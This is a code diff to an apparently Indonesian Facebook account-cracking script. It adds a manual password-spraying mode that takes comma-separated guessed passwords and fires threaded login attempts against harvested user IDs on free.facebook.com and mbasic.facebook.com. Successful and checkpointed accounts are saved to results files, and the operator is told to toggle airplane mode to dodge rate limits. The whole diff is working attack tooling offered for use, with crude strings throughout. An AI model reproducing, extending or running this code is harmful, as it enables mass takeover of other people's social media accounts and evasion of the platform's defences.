@@ -103,9 +103,9 @@ header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QK
 
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
-ugen = ['NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile']
+#agen1 = ['NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile']
 
-ugen2 = ['NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']
+#agen2 = ['NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']
 
 ###########################################################################################
 
@@ -268,6 +268,19 @@ def jalan(z):
 
 
         time.sleep(0.03)
+
+
+
+     
+
+
+
+def mentod():
+    print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n %sMETHOD MENU%s'%(N,BM,N))
+    print(' %s[%s1%s] Free (%sfast%s)'%(N,H,N,H,N))
+    print(' [%s2%s] Mbasic (%sSlow%s)'%(H,N,H,N))
+    print(' [%s3%s] Mobile (%sSuper Slow%s)'%(H,N,H,N))
+
 
 
 #-------- LOADING ANIMASI ------------
@@ -816,6 +829,21 @@ class __crack__:
 
         self.id = []
 
+    # ------- NAMPILKAN APLIKASI --------
+
+    def tampilkan_apk(self):
+
+        print("%s\n [%s!%s] Tampilkan Aplikasi Terkait. Ini Akan Menyebabkan Akun Terkena Spam Dan Akan Banyak Hasil Yang Checkpoints, Ini Tidak Di Rekomendasikan Untuk Dijalakan Jika Mau Hasil Bagus ! "%(N,M,N))
+        crot = input(f" {N}[{K}?{N}] Ingin Tetap Tampilakan Apps ? [{H}y{N}/{M}t{N}]: ")
+        if crot in["rchxai"]:
+            print(f" {N}[{M}×{N}] Don't be empty");self.tampilkan_apk()
+        elif crot in["Y","y"]:
+            Apk.append("y")
+        elif crot in["T","t"]:
+            Apk.append("t")
+        else:
+            print(f" {N}[{M}×{N}] Choose between y/t");self.tampilkan_apk()
+
 
 
 # METODE SANDI MANUAL
@@ -827,8 +855,70 @@ class __crack__:
         print(f'\n %s[%s•%s] Total ID : %s%s%s' %(N,H,N,H,len(self.id),N))
         ___yayanganteng___ = input('%s\n [%s?%s] Silakan Tekan (%sENTER%s) : %s'%(N,K,N,H,N,H))
         if ___yayanganteng___ in ('Kontol'):
-            self. __pler__()
-        
+            self.tampilkan_apk()
+            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n %sSETTING MANUAL PASSWORD%s'%(N,BM,N))
+            print(' %s[%s!%s] Berikan Tanda %sKomma%s Pada Setiap Kata\n [%s•%s] Example : %sbangsat%s,%ssayang%s,%skontol'%(N,M,N,H,N,H,N,H,N,H,N,H))
+            while True:
+                pwek = input(' %s[%s?%s] Enter password : %s'%(N,K,N,H))
+                print(' %s[%s•%s] Active Password : %s%s%s' % (N,H,N,H, pwek, N))
+                if pwek == '':
+                    print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N))
+                elif len(pwek)<=5:
+                    print('\n %s[%s×%s] Password minimum 6 characters'%(N,M,N))
+                else:
+                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
+                        cin = input('\n %s[%s?%s] Choose method : '%(N,K,N))
+                        if cin == '':
+                            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));__yan__()
+                        elif cin == '1':
+                            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
+                            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
+                            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s!%s] Aktifkan Mode Pesawat 5 detik jika Terkena Spam \n [%s!%s] Aktifkan Mode Pesawat Pada DUMP ID Ke 1000\n [%s!%s] CTRL+Z %sPada Keyboard%s Jika Ingin Stop !\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄'%(N,M,N,M,N,M,N,H,N))
+                            with YayanGanteng(max_workers=30) as (__yayanXD__):
+                                for ikeh in self.id:
+                                    try:
+                                        kimochi = ikeh.split('<=>')[0]
+                                        __yayanXD__.submit(self.__metode__, kimochi, ysc, "free.facebook.com")
+                                    except: pass
+                            hasil(ok,cp)
+                        elif cin == '2':
+                            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
+                            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
+                            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s!%s]Aktifkan Mode Pesawat 5 detik jika Terkena Spam \n [%s!%s] Aktifkan Mode Pesawat Pada DUMP ID Ke 1000\n [%s!%s] CTRL+Z %sPada Keyboard%s Jika Ingin Stop !\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄'%(N,M,N,M,N,M,N,H,N))
+                            with YayanGanteng(max_workers=30) as (__yayanXD__):
+                                for ikeh in self.id:
+                                    try:
+                                        kimochi = ikeh.split('<=>')[0]
+                                        __yayanXD__.submit(self.__metode__, kimochi, ysc, "mbasic.facebook.com")
+                                    except: pass
+                            hasil(ok,cp)
+                        elif cin == '3':
+                            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
+                            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
+                            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s!%s] Aktifkan Mode Pesawat 5 detik jika Terkena Spam \n [%s!%s] Aktifkan Mode Pesawat Pada DUMP ID Ke 1000\n [%s!%s] CTRL+Z %sPada Keyboard%s Jika Ingin Stop !\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄'%(N,M,N,M,N,M,N,H,N))
+                            with YayanGanteng(max_workers=30) as (__yayanXD__):
+                                for ikeh in self.id:
+                                    try:
+                                        kimochi = ikeh.split('<=>')[0]
+                                        __yayanXD__.submit(self.__metode__, kimochi, ysc, "mbasic.facebook.com")
+                                    except: pass
+                            hasil(ok,cp)
+                        else:
+                            print(' [%s×%s] Sorry, it is wrong...!'%(N,M,N));__yan__()
+                    mentod()
+                    __yan__(pwek.split(','))
+                    break
+        elif ___yayanganteng___ in ('bgs'):
+            self.tampilkan_apk()
+            mentod()
+            self.__pler__()
+        else:
+            jalan(' %s[%s×%s] Sorry, wrong SC Password'%(N,M,N));self.plerr(id)
+
+            #print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.plerr(id)
+# PROSES CRACK METODE 3 in 1
+
+
 
     def __metode__(self, cebok, user, pasw):
         global ok,cp,loop
@@ -894,12 +984,11 @@ class __crack__:
             self.__metode__(cebok, user, pasw)
 
 
+
+
     def __pler__(self):
-        print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n %sMETHOD MENU%s'%(N,BM,N))
-    print(' %s[%s1%s] Free (%sfast%s)'%(N,H,N,H,N))
-    print(' [%s2%s] Mbasic (%sSlow%s)'%(H,N,H,N))
-    print(' [%s3%s] Mobile (%sSuper Slow%s)'%(H,N,H,N))
-        yan = input(f"\n {N}[{K}?{N}] Choose Method : ")
+
+        yan = input('\n %s[%s?%s] Choose Method : '%(N,K,N))
         if yan == '':
             print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()
         elif yan in ('1', '01'):
